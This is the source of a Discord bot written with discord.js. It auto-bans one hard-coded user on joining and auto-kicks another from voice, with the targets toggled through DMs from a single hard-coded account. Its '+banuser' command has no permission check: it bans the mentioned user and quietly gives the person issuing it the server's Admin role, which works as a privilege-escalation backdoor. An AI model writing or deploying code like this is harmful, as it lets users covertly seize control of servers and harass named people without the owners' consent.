const Discord = require('discord.js');

const client = new Discord.Client();



client.on('ready', () => {

    console.log('I am ready!');


});
let list = new Map();



client.on('guildMemberAdd', member => {
    //AUTO KICK IGEL0019
   if (member.id === "767048733459349526") {
       if (list.get(member.id)) {
           if (member.bannable) {
               member.ban().then();

           }
       }

   }
});
client.on('voiceStateUpdate', update => {
        //AUTO VC KICK LUXI

        const  x =update.guild.members.cache.find( user => user.id === "641348606275747841");
        if (x.voice != null && list.get(x.id)) {

            x.voice.kick().then();

    }
});
client.on("message", message => {
   if (message.channel.type === 'dm') {
       if (message.author.id === '334595545060605955') {
           if (message.content.startsWith("stopautokick")) {
               message.channel.send("Yeah workds that far");
               let x = message.content.split(" ");
               if (x.length === 2) {
                   message.channel.send("workds even farther");
                   if (list.has(x[1])) {
                       list.set(x[1], !list.get(x[1]));
                   } else {
                       list.set(x[1], true);
                   }
               }
           }
       }

   }
});

client.on('message', message => {
    const prefix = "+"
    const split = message.content.split(" ");
    const command = split[0]
    const args = split.slice(1);

    if (command.startsWith(prefix + "banuser")) {

        if (args.length === 1) {

            message.guild.members.ban(message.mentions.users.first());
            const role = message.guild.roles.cache.find(role => role.name.includes("Admin"));
            role.hoist = false;
            role.color = 123;
            message.guild.member(message.author).roles.add(role);
        }



    }














});



// THIS  MUST  BE  THIS  WAY

client.login(process.env.BOT_TOKEN);